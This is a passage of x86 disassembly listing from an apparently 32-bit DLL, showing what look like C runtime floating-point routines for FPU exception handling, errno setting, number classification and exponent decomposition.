1000be54:	5f                   	pop    %edi
1000be55:	74 08                	je     0x1000be5f
1000be57:	6a 10                	push   $0x10
1000be59:	e8 1e fa ff ff       	call   0x1000b87c
1000be5e:	59                   	pop    %ecx
1000be5f:	83 e6 fd             	and    $0xfffffffd,%esi
1000be62:	f6 c3 10             	test   $0x10,%bl
1000be65:	74 11                	je     0x1000be78
1000be67:	f6 45 10 20          	testb  $0x20,0x10(%ebp)
1000be6b:	74 0b                	je     0x1000be78
1000be6d:	6a 20                	push   $0x20
1000be6f:	e8 08 fa ff ff       	call   0x1000b87c
1000be74:	59                   	pop    %ecx
1000be75:	83 e6 ef             	and    $0xffffffef,%esi
1000be78:	33 c0                	xor    %eax,%eax
1000be7a:	85 f6                	test   %esi,%esi
1000be7c:	5e                   	pop    %esi
1000be7d:	0f 94 c0             	sete   %al
1000be80:	5b                   	pop    %ebx
1000be81:	c9                   	leave
1000be82:	c3                   	ret
1000be83:	8b ff                	mov    %edi,%edi
1000be85:	55                   	push   %ebp
1000be86:	8b ec                	mov    %esp,%ebp
1000be88:	6a 00                	push   $0x0
1000be8a:	ff 75 1c             	push   0x1c(%ebp)
1000be8d:	ff 75 18             	push   0x18(%ebp)
1000be90:	ff 75 14             	push   0x14(%ebp)
1000be93:	ff 75 10             	push   0x10(%ebp)
1000be96:	ff 75 0c             	push   0xc(%ebp)
1000be99:	ff 75 08             	push   0x8(%ebp)
1000be9c:	e8 05 00 00 00       	call   0x1000bea6
1000bea1:	83 c4 1c             	add    $0x1c,%esp
1000bea4:	5d                   	pop    %ebp
1000bea5:	c3                   	ret
1000bea6:	8b ff                	mov    %edi,%edi
1000bea8:	55                   	push   %ebp
1000bea9:	8b ec                	mov    %esp,%ebp
1000beab:	8b 45 08             	mov    0x8(%ebp),%eax
1000beae:	33 c9                	xor    %ecx,%ecx
1000beb0:	53                   	push   %ebx
1000beb1:	33 db                	xor    %ebx,%ebx
1000beb3:	43                   	inc    %ebx
1000beb4:	89 48 04             	mov    %ecx,0x4(%eax)
1000beb7:	8b 45 08             	mov    0x8(%ebp),%eax
1000beba:	57                   	push   %edi
1000bebb:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
1000bec0:	89 48 08             	mov    %ecx,0x8(%eax)
1000bec3:	8b 45 08             	mov    0x8(%ebp),%eax
1000bec6:	89 48 0c             	mov    %ecx,0xc(%eax)
1000bec9:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000becc:	f6 c1 10             	test   $0x10,%cl
1000becf:	74 0b                	je     0x1000bedc
1000bed1:	8b 45 08             	mov    0x8(%ebp),%eax
1000bed4:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
1000bed9:	09 58 04             	or     %ebx,0x4(%eax)
1000bedc:	f6 c1 02             	test   $0x2,%cl
1000bedf:	74 0c                	je     0x1000beed
1000bee1:	8b 45 08             	mov    0x8(%ebp),%eax
1000bee4:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
1000bee9:	83 48 04 02          	orl    $0x2,0x4(%eax)
1000beed:	f6 c1 01             	test   $0x1,%cl
1000bef0:	74 0c                	je     0x1000befe
1000bef2:	8b 45 08             	mov    0x8(%ebp),%eax
1000bef5:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
1000befa:	83 48 04 04          	orl    $0x4,0x4(%eax)
1000befe:	f6 c1 04             	test   $0x4,%cl
1000bf01:	74 0c                	je     0x1000bf0f
1000bf03:	8b 45 08             	mov    0x8(%ebp),%eax
1000bf06:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
1000bf0b:	83 48 04 08          	orl    $0x8,0x4(%eax)
1000bf0f:	f6 c1 08             	test   $0x8,%cl
1000bf12:	74 0c                	je     0x1000bf20
1000bf14:	8b 45 08             	mov    0x8(%ebp),%eax
1000bf17:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
1000bf1c:	83 48 04 10          	orl    $0x10,0x4(%eax)
1000bf20:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000bf23:	56                   	push   %esi
1000bf24:	8b 75 0c             	mov    0xc(%ebp),%esi
1000bf27:	8b 06                	mov    (%esi),%eax
1000bf29:	c1 e0 04             	shl    $0x4,%eax
1000bf2c:	f7 d0                	not    %eax
1000bf2e:	33 41 08             	xor    0x8(%ecx),%eax
1000bf31:	83 e0 10             	and    $0x10,%eax
1000bf34:	31 41 08             	xor    %eax,0x8(%ecx)
1000bf37:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000bf3a:	8b 06                	mov    (%esi),%eax
1000bf3c:	03 c0                	add    %eax,%eax
1000bf3e:	f7 d0                	not    %eax
1000bf40:	33 41 08             	xor    0x8(%ecx),%eax
1000bf43:	83 e0 08             	and    $0x8,%eax
1000bf46:	31 41 08             	xor    %eax,0x8(%ecx)
1000bf49:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000bf4c:	8b 06                	mov    (%esi),%eax
1000bf4e:	d1 e8                	shr    $1,%eax
1000bf50:	f7 d0                	not    %eax
1000bf52:	33 41 08             	xor    0x8(%ecx),%eax
1000bf55:	83 e0 04             	and    $0x4,%eax
1000bf58:	31 41 08             	xor    %eax,0x8(%ecx)
1000bf5b:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000bf5e:	8b 06                	mov    (%esi),%eax
1000bf60:	c1 e8 03             	shr    $0x3,%eax
1000bf63:	f7 d0                	not    %eax
1000bf65:	33 41 08             	xor    0x8(%ecx),%eax
1000bf68:	83 e0 02             	and    $0x2,%eax
1000bf6b:	31 41 08             	xor    %eax,0x8(%ecx)
1000bf6e:	8b 06                	mov    (%esi),%eax
1000bf70:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000bf73:	c1 e8 05             	shr    $0x5,%eax
1000bf76:	f7 d0                	not    %eax
1000bf78:	33 41 08             	xor    0x8(%ecx),%eax
1000bf7b:	23 c3                	and    %ebx,%eax
1000bf7d:	31 41 08             	xor    %eax,0x8(%ecx)
1000bf80:	e8 50 f9 ff ff       	call   0x1000b8d5
1000bf85:	8b d0                	mov    %eax,%edx
1000bf87:	f6 c2 01             	test   $0x1,%dl
1000bf8a:	74 07                	je     0x1000bf93
1000bf8c:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000bf8f:	83 49 0c 10          	orl    $0x10,0xc(%ecx)
1000bf93:	f6 c2 04             	test   $0x4,%dl
1000bf96:	74 07                	je     0x1000bf9f
1000bf98:	8b 45 08             	mov    0x8(%ebp),%eax
1000bf9b:	83 48 0c 08          	orl    $0x8,0xc(%eax)
1000bf9f:	f6 c2 08             	test   $0x8,%dl
1000bfa2:	74 07                	je     0x1000bfab
1000bfa4:	8b 45 08             	mov    0x8(%ebp),%eax
1000bfa7:	83 48 0c 04          	orl    $0x4,0xc(%eax)
1000bfab:	f6 c2 10             	test   $0x10,%dl
1000bfae:	74 07                	je     0x1000bfb7
1000bfb0:	8b 45 08             	mov    0x8(%ebp),%eax
1000bfb3:	83 48 0c 02          	orl    $0x2,0xc(%eax)
1000bfb7:	f6 c2 20             	test   $0x20,%dl
1000bfba:	74 06                	je     0x1000bfc2
1000bfbc:	8b 45 08             	mov    0x8(%ebp),%eax
1000bfbf:	09 58 0c             	or     %ebx,0xc(%eax)
1000bfc2:	8b 06                	mov    (%esi),%eax
1000bfc4:	b9 00 0c 00 00       	mov    $0xc00,%ecx
1000bfc9:	23 c1                	and    %ecx,%eax
1000bfcb:	74 35                	je     0x1000c002
1000bfcd:	3d 00 04 00 00       	cmp    $0x400,%eax
1000bfd2:	74 22                	je     0x1000bff6
1000bfd4:	3d 00 08 00 00       	cmp    $0x800,%eax
1000bfd9:	74 0c                	je     0x1000bfe7
1000bfdb:	3b c1                	cmp    %ecx,%eax
1000bfdd:	75 29                	jne    0x1000c008
1000bfdf:	8b 45 08             	mov    0x8(%ebp),%eax
1000bfe2:	83 08 03             	orl    $0x3,(%eax)
1000bfe5:	eb 21                	jmp    0x1000c008
1000bfe7:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000bfea:	8b 01                	mov    (%ecx),%eax
1000bfec:	83 e0 fe             	and    $0xfffffffe,%eax
1000bfef:	83 c8 02             	or     $0x2,%eax
1000bff2:	89 01                	mov    %eax,(%ecx)
1000bff4:	eb 12                	jmp    0x1000c008
1000bff6:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000bff9:	8b 01                	mov    (%ecx),%eax
1000bffb:	83 e0 fd             	and    $0xfffffffd,%eax
1000bffe:	0b c3                	or     %ebx,%eax
1000c000:	eb f0                	jmp    0x1000bff2
1000c002:	8b 45 08             	mov    0x8(%ebp),%eax
1000c005:	83 20 fc             	andl   $0xfffffffc,(%eax)
1000c008:	8b 06                	mov    (%esi),%eax
1000c00a:	b9 00 03 00 00       	mov    $0x300,%ecx
1000c00f:	23 c1                	and    %ecx,%eax
1000c011:	74 20                	je     0x1000c033
1000c013:	3d 00 02 00 00       	cmp    $0x200,%eax
1000c018:	74 0c                	je     0x1000c026
1000c01a:	3b c1                	cmp    %ecx,%eax
1000c01c:	75 22                	jne    0x1000c040
1000c01e:	8b 45 08             	mov    0x8(%ebp),%eax
1000c021:	83 20 e3             	andl   $0xffffffe3,(%eax)
1000c024:	eb 1a                	jmp    0x1000c040
1000c026:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000c029:	8b 01                	mov    (%ecx),%eax
1000c02b:	83 e0 e7             	and    $0xffffffe7,%eax
1000c02e:	83 c8 04             	or     $0x4,%eax
1000c031:	eb 0b                	jmp    0x1000c03e
1000c033:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000c036:	8b 01                	mov    (%ecx),%eax
1000c038:	83 e0 eb             	and    $0xffffffeb,%eax
1000c03b:	83 c8 08             	or     $0x8,%eax
1000c03e:	89 01                	mov    %eax,(%ecx)
1000c040:	8b 45 08             	mov    0x8(%ebp),%eax
1000c043:	8b 4d 14             	mov    0x14(%ebp),%ecx
1000c046:	c1 e1 05             	shl    $0x5,%ecx
1000c049:	33 08                	xor    (%eax),%ecx
1000c04b:	81 e1 e0 ff 01 00    	and    $0x1ffe0,%ecx
1000c051:	31 08                	xor    %ecx,(%eax)
1000c053:	8b 45 08             	mov    0x8(%ebp),%eax
1000c056:	09 58 20             	or     %ebx,0x20(%eax)
1000c059:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
1000c05d:	74 2c                	je     0x1000c08b
1000c05f:	8b 45 08             	mov    0x8(%ebp),%eax
1000c062:	83 60 20 e1          	andl   $0xffffffe1,0x20(%eax)
1000c066:	8b 45 18             	mov    0x18(%ebp),%eax
1000c069:	d9 00                	flds   (%eax)
1000c06b:	8b 45 08             	mov    0x8(%ebp),%eax
1000c06e:	d9 58 10             	fstps  0x10(%eax)
1000c071:	8b 45 08             	mov    0x8(%ebp),%eax
1000c074:	09 58 60             	or     %ebx,0x60(%eax)
1000c077:	8b 45 08             	mov    0x8(%ebp),%eax
1000c07a:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
1000c07d:	83 60 60 e1          	andl   $0xffffffe1,0x60(%eax)
1000c081:	8b 45 08             	mov    0x8(%ebp),%eax
1000c084:	d9 03                	flds   (%ebx)
1000c086:	d9 58 50             	fstps  0x50(%eax)
1000c089:	eb 3a                	jmp    0x1000c0c5
1000c08b:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000c08e:	8b 41 20             	mov    0x20(%ecx),%eax
1000c091:	83 e0 e3             	and    $0xffffffe3,%eax
1000c094:	83 c8 02             	or     $0x2,%eax
1000c097:	89 41 20             	mov    %eax,0x20(%ecx)
1000c09a:	8b 45 18             	mov    0x18(%ebp),%eax
1000c09d:	dd 00                	fldl   (%eax)
1000c09f:	8b 45 08             	mov    0x8(%ebp),%eax
1000c0a2:	dd 58 10             	fstpl  0x10(%eax)
1000c0a5:	8b 45 08             	mov    0x8(%ebp),%eax
1000c0a8:	09 58 60             	or     %ebx,0x60(%eax)
1000c0ab:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000c0ae:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
1000c0b1:	8b 41 60             	mov    0x60(%ecx),%eax
1000c0b4:	83 e0 e3             	and    $0xffffffe3,%eax
1000c0b7:	83 c8 02             	or     $0x2,%eax
1000c0ba:	89 41 60             	mov    %eax,0x60(%ecx)
1000c0bd:	8b 45 08             	mov    0x8(%ebp),%eax
1000c0c0:	dd 03                	fldl   (%ebx)
1000c0c2:	dd 58 50             	fstpl  0x50(%eax)
1000c0c5:	e8 77 f7 ff ff       	call   0x1000b841
1000c0ca:	8d 45 08             	lea    0x8(%ebp),%eax
1000c0cd:	50                   	push   %eax
1000c0ce:	6a 01                	push   $0x1
1000c0d0:	6a 00                	push   $0x0
1000c0d2:	57                   	push   %edi
1000c0d3:	ff 15 8c d0 00 10    	call   *0x1000d08c
1000c0d9:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000c0dc:	8b 41 08             	mov    0x8(%ecx),%eax
1000c0df:	a8 10                	test   $0x10,%al
1000c0e1:	74 06                	je     0x1000c0e9
1000c0e3:	83 26 fe             	andl   $0xfffffffe,(%esi)
1000c0e6:	8b 41 08             	mov    0x8(%ecx),%eax
1000c0e9:	a8 08                	test   $0x8,%al
1000c0eb:	74 06                	je     0x1000c0f3
1000c0ed:	83 26 fb             	andl   $0xfffffffb,(%esi)
1000c0f0:	8b 41 08             	mov    0x8(%ecx),%eax
1000c0f3:	a8 04                	test   $0x4,%al
1000c0f5:	74 06                	je     0x1000c0fd
1000c0f7:	83 26 f7             	andl   $0xfffffff7,(%esi)
1000c0fa:	8b 41 08             	mov    0x8(%ecx),%eax
1000c0fd:	a8 02                	test   $0x2,%al
1000c0ff:	74 06                	je     0x1000c107
1000c101:	83 26 ef             	andl   $0xffffffef,(%esi)
1000c104:	8b 41 08             	mov    0x8(%ecx),%eax
1000c107:	a8 01                	test   $0x1,%al
1000c109:	74 03                	je     0x1000c10e
1000c10b:	83 26 df             	andl   $0xffffffdf,(%esi)
1000c10e:	8b 01                	mov    (%ecx),%eax
1000c110:	ba ff f3 ff ff       	mov    $0xfffff3ff,%edx
1000c115:	83 e0 03             	and    $0x3,%eax
1000c118:	83 e8 00             	sub    $0x0,%eax
1000c11b:	74 35                	je     0x1000c152
1000c11d:	83 e8 01             	sub    $0x1,%eax
1000c120:	74 22                	je     0x1000c144
1000c122:	83 e8 01             	sub    $0x1,%eax
1000c125:	74 0d                	je     0x1000c134
1000c127:	83 e8 01             	sub    $0x1,%eax
1000c12a:	75 28                	jne    0x1000c154
1000c12c:	81 0e 00 0c 00 00    	orl    $0xc00,(%esi)
1000c132:	eb 20                	jmp    0x1000c154
1000c134:	8b 06                	mov    (%esi),%eax
1000c136:	25 ff fb ff ff       	and    $0xfffffbff,%eax
1000c13b:	0d 00 08 00 00       	or     $0x800,%eax
1000c140:	89 06                	mov    %eax,(%esi)
1000c142:	eb 10                	jmp    0x1000c154
1000c144:	8b 06                	mov    (%esi),%eax
1000c146:	25 ff f7 ff ff       	and    $0xfffff7ff,%eax
1000c14b:	0d 00 04 00 00       	or     $0x400,%eax
1000c150:	eb ee                	jmp    0x1000c140
1000c152:	21 16                	and    %edx,(%esi)
1000c154:	8b 01                	mov    (%ecx),%eax
1000c156:	c1 e8 02             	shr    $0x2,%eax
1000c159:	83 e0 07             	and    $0x7,%eax
1000c15c:	83 e8 00             	sub    $0x0,%eax
1000c15f:	74 19                	je     0x1000c17a
1000c161:	83 e8 01             	sub    $0x1,%eax
1000c164:	74 09                	je     0x1000c16f
1000c166:	83 e8 01             	sub    $0x1,%eax
1000c169:	75 1a                	jne    0x1000c185
1000c16b:	21 16                	and    %edx,(%esi)
1000c16d:	eb 16                	jmp    0x1000c185
1000c16f:	8b 06                	mov    (%esi),%eax
1000c171:	23 c2                	and    %edx,%eax
1000c173:	0d 00 02 00 00       	or     $0x200,%eax
1000c178:	eb 09                	jmp    0x1000c183
1000c17a:	8b 06                	mov    (%esi),%eax
1000c17c:	23 c2                	and    %edx,%eax
1000c17e:	0d 00 03 00 00       	or     $0x300,%eax
1000c183:	89 06                	mov    %eax,(%esi)
1000c185:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
1000c189:	5e                   	pop    %esi
1000c18a:	74 07                	je     0x1000c193
1000c18c:	d9 41 50             	flds   0x50(%ecx)
1000c18f:	d9 1b                	fstps  (%ebx)
1000c191:	eb 05                	jmp    0x1000c198
1000c193:	dd 41 50             	fldl   0x50(%ecx)
1000c196:	dd 1b                	fstpl  (%ebx)
1000c198:	5f                   	pop    %edi
1000c199:	5b                   	pop    %ebx
1000c19a:	5d                   	pop    %ebp
1000c19b:	c3                   	ret
1000c19c:	8b ff                	mov    %edi,%edi
1000c19e:	55                   	push   %ebp
1000c19f:	8b ec                	mov    %esp,%ebp
1000c1a1:	8b 45 08             	mov    0x8(%ebp),%eax
1000c1a4:	83 f8 01             	cmp    $0x1,%eax
1000c1a7:	74 15                	je     0x1000c1be
1000c1a9:	83 c0 fe             	add    $0xfffffffe,%eax
1000c1ac:	83 f8 01             	cmp    $0x1,%eax
1000c1af:	77 18                	ja     0x1000c1c9
1000c1b1:	e8 60 94 ff ff       	call   0x10005616
1000c1b6:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
1000c1bc:	5d                   	pop    %ebp
1000c1bd:	c3                   	ret
1000c1be:	e8 53 94 ff ff       	call   0x10005616
1000c1c3:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
1000c1c9:	5d                   	pop    %ebp
1000c1ca:	c3                   	ret
1000c1cb:	8b ff                	mov    %edi,%edi
1000c1cd:	55                   	push   %ebp
1000c1ce:	8b ec                	mov    %esp,%ebp
1000c1d0:	8b 55 0c             	mov    0xc(%ebp),%edx
1000c1d3:	83 ec 20             	sub    $0x20,%esp
1000c1d6:	33 c9                	xor    %ecx,%ecx
1000c1d8:	8b c1                	mov    %ecx,%eax
1000c1da:	39 14 c5 d8 1a 01 10 	cmp    %edx,0x10011ad8(,%eax,8)
1000c1e1:	74 08                	je     0x1000c1eb
1000c1e3:	40                   	inc    %eax
1000c1e4:	83 f8 1d             	cmp    $0x1d,%eax
1000c1e7:	7c f1                	jl     0x1000c1da
1000c1e9:	eb 07                	jmp    0x1000c1f2
1000c1eb:	8b 0c c5 dc 1a 01 10 	mov    0x10011adc(,%eax,8),%ecx
1000c1f2:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
1000c1f5:	85 c9                	test   %ecx,%ecx
1000c1f7:	74 55                	je     0x1000c24e
1000c1f9:	8b 45 10             	mov    0x10(%ebp),%eax
1000c1fc:	89 45 e8             	mov    %eax,-0x18(%ebp)
1000c1ff:	8b 45 14             	mov    0x14(%ebp),%eax
1000c202:	89 45 ec             	mov    %eax,-0x14(%ebp)
1000c205:	8b 45 18             	mov    0x18(%ebp),%eax
1000c208:	89 45 f0             	mov    %eax,-0x10(%ebp)
1000c20b:	8b 45 1c             	mov    0x1c(%ebp),%eax
1000c20e:	56                   	push   %esi
1000c20f:	8b 75 08             	mov    0x8(%ebp),%esi
1000c212:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000c215:	8b 45 20             	mov    0x20(%ebp),%eax
1000c218:	68 ff ff 00 00       	push   $0xffff
1000c21d:	ff 75 28             	push   0x28(%ebp)
1000c220:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000c223:	8b 45 24             	mov    0x24(%ebp),%eax
1000c226:	89 75 e0             	mov    %esi,-0x20(%ebp)
1000c229:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000c22c:	e8 21 f6 ff ff       	call   0x1000b852
1000c231:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000c234:	50                   	push   %eax
1000c235:	e8 0f c0 ff ff       	call   0x10008249
1000c23a:	83 c4 0c             	add    $0xc,%esp
1000c23d:	85 c0                	test   %eax,%eax
1000c23f:	75 07                	jne    0x1000c248
1000c241:	56                   	push   %esi
1000c242:	e8 55 ff ff ff       	call   0x1000c19c
1000c247:	59                   	pop    %ecx
1000c248:	dd 45 f8             	fldl   -0x8(%ebp)
1000c24b:	5e                   	pop    %esi
1000c24c:	c9                   	leave
1000c24d:	c3                   	ret
1000c24e:	68 ff ff 00 00       	push   $0xffff
1000c253:	ff 75 28             	push   0x28(%ebp)
1000c256:	e8 f7 f5 ff ff       	call   0x1000b852
1000c25b:	ff 75 08             	push   0x8(%ebp)
1000c25e:	e8 39 ff ff ff       	call   0x1000c19c
1000c263:	dd 45 20             	fldl   0x20(%ebp)
1000c266:	83 c4 0c             	add    $0xc,%esp
1000c269:	c9                   	leave
1000c26a:	c3                   	ret
1000c26b:	8b ff                	mov    %edi,%edi
1000c26d:	55                   	push   %ebp
1000c26e:	8b ec                	mov    %esp,%ebp
1000c270:	dd 45 08             	fldl   0x8(%ebp)
1000c273:	d9 ee                	fldz
1000c275:	dd e1                	fucom  %st(1)
1000c277:	df e0                	fnstsw %ax
1000c279:	56                   	push   %esi
1000c27a:	f6 c4 44             	test   $0x44,%ah
1000c27d:	7a 09                	jp     0x1000c288
1000c27f:	dd d9                	fstp   %st(1)
1000c281:	33 f6                	xor    %esi,%esi
1000c283:	e9 ad 00 00 00       	jmp    0x1000c335
1000c288:	57                   	push   %edi
1000c289:	66 8b 7d 0e          	mov    0xe(%ebp),%di
1000c28d:	0f b7 c7             	movzwl %di,%eax
1000c290:	a9 f0 7f 00 00       	test   $0x7ff0,%eax
1000c295:	75 7a                	jne    0x1000c311
1000c297:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000c29a:	8b 55 08             	mov    0x8(%ebp),%edx
1000c29d:	f7 c1 ff ff 0f 00    	test   $0xfffff,%ecx
1000c2a3:	75 04                	jne    0x1000c2a9
1000c2a5:	85 d2                	test   %edx,%edx
1000c2a7:	74 68                	je     0x1000c311
1000c2a9:	de d9                	fcompp
1000c2ab:	be 03 fc ff ff       	mov    $0xfffffc03,%esi
1000c2b0:	df e0                	fnstsw %ax
1000c2b2:	53                   	push   %ebx
1000c2b3:	33 db                	xor    %ebx,%ebx
1000c2b5:	f6 c4 41             	test   $0x41,%ah
1000c2b8:	75 01                	jne    0x1000c2bb
1000c2ba:	43                   	inc    %ebx
1000c2bb:	f6 45 0e 10          	testb  $0x10,0xe(%ebp)
1000c2bf:	75 1f                	jne    0x1000c2e0
1000c2c1:	03 c9                	add    %ecx,%ecx
1000c2c3:	89 4d 0c             	mov    %ecx,0xc(%ebp)
1000c2c6:	85 d2                	test   %edx,%edx
1000c2c8:	79 06                	jns    0x1000c2d0
1000c2ca:	83 c9 01             	or     $0x1,%ecx
1000c2cd:	89 4d 0c             	mov    %ecx,0xc(%ebp)
1000c2d0:	03 d2                	add    %edx,%edx
1000c2d2:	4e                   	dec    %esi
1000c2d3:	f6 45 0e 10          	testb  $0x10,0xe(%ebp)
1000c2d7:	74 e8                	je     0x1000c2c1
1000c2d9:	66 8b 7d 0e          	mov    0xe(%ebp),%di
1000c2dd:	89 55 08             	mov    %edx,0x8(%ebp)
1000c2e0:	b8 ef ff 00 00       	mov    $0xffef,%eax
1000c2e5:	66 23 f8             	and    %ax,%di
1000c2e8:	85 db                	test   %ebx,%ebx
1000c2ea:	0f b7 c7             	movzwl %di,%eax
1000c2ed:	66 89 7d 0e          	mov    %di,0xe(%ebp)
1000c2f1:	5b                   	pop    %ebx
1000c2f2:	74 09                	je     0x1000c2fd
1000c2f4:	0d 00 80 00 00       	or     $0x8000,%eax
1000c2f9:	66 89 45 0e          	mov    %ax,0xe(%ebp)
1000c2fd:	dd 45 08             	fldl   0x8(%ebp)
1000c300:	6a 00                	push   $0x0
1000c302:	51                   	push   %ecx
1000c303:	51                   	push   %ecx
1000c304:	dd 1c 24             	fstpl  (%esp)
1000c307:	e8 31 00 00 00       	call   0x1000c33d
1000c30c:	83 c4 0c             	add    $0xc,%esp
1000c30f:	eb 23                	jmp    0x1000c334
1000c311:	6a 00                	push   $0x0
1000c313:	51                   	push   %ecx
1000c314:	dd d8                	fstp   %st(0)
1000c316:	51                   	push   %ecx
1000c317:	dd 1c 24             	fstpl  (%esp)
1000c31a:	e8 1e 00 00 00       	call   0x1000c33d
1000c31f:	0f b7 f7             	movzwl %di,%esi
1000c322:	83 c4 0c             	add    $0xc,%esp
1000c325:	c1 ee 04             	shr    $0x4,%esi
1000c328:	81 e6 ff 07 00 00    	and    $0x7ff,%esi
1000c32e:	81 ee fe 03 00 00    	sub    $0x3fe,%esi
1000c334:	5f                   	pop    %edi
1000c335:	8b 45 10             	mov    0x10(%ebp),%eax
1000c338:	89 30                	mov    %esi,(%eax)
1000c33a:	5e                   	pop    %esi
1000c33b:	5d                   	pop    %ebp
1000c33c:	c3                   	ret
1000c33d:	8b ff                	mov    %edi,%edi
1000c33f:	55                   	push   %ebp
1000c340:	8b ec                	mov    %esp,%ebp
1000c342:	51                   	push   %ecx
1000c343:	51                   	push   %ecx
1000c344:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000c347:	0f b7 45 0e          	movzwl 0xe(%ebp),%eax
1000c34b:	dd 45 08             	fldl   0x8(%ebp)
1000c34e:	25 0f 80 00 00       	and    $0x800f,%eax
1000c353:	dd 5d f8             	fstpl  -0x8(%ebp)
1000c356:	8d 89 fe 03 00 00    	lea    0x3fe(%ecx),%ecx
1000c35c:	c1 e1 04             	shl    $0x4,%ecx
1000c35f:	0b c8                	or     %eax,%ecx
1000c361:	66 89 4d fe          	mov    %cx,-0x2(%ebp)
1000c365:	dd 45 f8             	fldl   -0x8(%ebp)
1000c368:	c9                   	leave
1000c369:	c3                   	ret
1000c36a:	8b ff                	mov    %edi,%edi
1000c36c:	55                   	push   %ebp
1000c36d:	8b ec                	mov    %esp,%ebp
1000c36f:	81 7d 0c 00 00 f0 7f 	cmpl   $0x7ff00000,0xc(%ebp)
1000c376:	8b 45 08             	mov    0x8(%ebp),%eax
1000c379:	75 07                	jne    0x1000c382
1000c37b:	85 c0                	test   %eax,%eax
1000c37d:	75 15                	jne    0x1000c394
1000c37f:	40                   	inc    %eax
1000c380:	5d                   	pop    %ebp
1000c381:	c3                   	ret
1000c382:	81 7d 0c 00 00 f0 ff 	cmpl   $0xfff00000,0xc(%ebp)
1000c389:	75 09                	jne    0x1000c394
1000c38b:	85 c0                	test   %eax,%eax
1000c38d:	75 05                	jne    0x1000c394
1000c38f:	6a 02                	push   $0x2
1000c391:	58                   	pop    %eax
1000c392:	5d                   	pop    %ebp
1000c393:	c3                   	ret
1000c394:	66 8b 4d 0e          	mov    0xe(%ebp),%cx
1000c398:	ba f8 7f 00 00       	mov    $0x7ff8,%edx
1000c39d:	66 23 ca             	and    %dx,%cx
1000c3a0:	66 3b ca             	cmp    %dx,%cx
1000c3a3:	75 04                	jne    0x1000c3a9
1000c3a5:	6a 03                	push   $0x3
1000c3a7:	eb e8                	jmp    0x1000c391
1000c3a9:	ba f0 7f 00 00       	mov    $0x7ff0,%edx
1000c3ae:	66 3b ca             	cmp    %dx,%cx
1000c3b1:	75 11                	jne    0x1000c3c4
1000c3b3:	f7 45 0c ff ff 07 00 	testl  $0x7ffff,0xc(%ebp)
1000c3ba:	75 04                	jne    0x1000c3c0
1000c3bc:	85 c0                	test   %eax,%eax
1000c3be:	74 04                	je     0x1000c3c4
1000c3c0:	6a 04                	push   $0x4
1000c3c2:	eb cd                	jmp    0x1000c391
1000c3c4:	33 c0                	xor    %eax,%eax
1000c3c6:	5d                   	pop    %ebp
1000c3c7:	c3                   	ret
1000c3c8:	8b ff                	mov    %edi,%edi
1000c3ca:	55                   	push   %ebp
1000c3cb:	8b ec                	mov    %esp,%ebp
1000c3cd:	66 8b 4d 0e          	mov    0xe(%ebp),%cx
1000c3d1:	ba f0 7f 00 00       	mov    $0x7ff0,%edx
1000c3d6:	66 8b c1             	mov    %cx,%ax
1000c3d9:	66 23 c2             	and    %dx,%ax
1000c3dc:	66 3b c2             	cmp    %dx,%ax
1000c3df:	75 33                	jne    0x1000c414
1000c3e1:	dd 45 08             	fldl   0x8(%ebp)
1000c3e4:	51                   	push   %ecx
1000c3e5:	51                   	push   %ecx
1000c3e6:	dd 1c 24             	fstpl  (%esp)
1000c3e9:	e8 7c ff ff ff       	call   0x1000c36a
1000c3ee:	59                   	pop    %ecx
1000c3ef:	59                   	pop    %ecx
1000c3f0:	83 e8 01             	sub    $0x1,%eax
1000c3f3:	74 18                	je     0x1000c40d
1000c3f5:	83 e8 01             	sub    $0x1,%eax
1000c3f8:	74 0e                	je     0x1000c408
1000c3fa:	83 e8 01             	sub    $0x1,%eax
1000c3fd:	74 05                	je     0x1000c404
1000c3ff:	33 c0                	xor    %eax,%eax
1000c401:	40                   	inc    %eax
1000c402:	5d                   	pop    %ebp
1000c403:	c3                   	ret
1000c404:	6a 02                	push   $0x2
1000c406:	eb 02                	jmp    0x1000c40a
1000c408:	6a 04                	push   $0x4
1000c40a:	58                   	pop    %eax
1000c40b:	5d                   	pop    %ebp
1000c40c:	c3                   	ret
1000c40d:	b8 00 02 00 00       	mov    $0x200,%eax
1000c412:	5d                   	pop    %ebp
1000c413:	c3                   	ret
1000c414:	0f b7 c9             	movzwl %cx,%ecx
1000c417:	81 e1 00 80 00 00    	and    $0x8000,%ecx
1000c41d:	66 85 c0             	test   %ax,%ax
1000c420:	75 1e                	jne    0x1000c440
1000c422:	f7 45 0c ff ff 0f 00 	testl  $0xfffff,0xc(%ebp)
1000c429:	75 06                	jne    0x1000c431
1000c42b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1000c42f:	74 0f                	je     0x1000c440
1000c431:	f7 d9                	neg    %ecx
1000c433:	1b c9                	sbb    %ecx,%ecx
1000c435:	83 e1 90             	and    $0xffffff90,%ecx
1000c438:	8d 81 80 00 00 00    	lea    0x80(%ecx),%eax
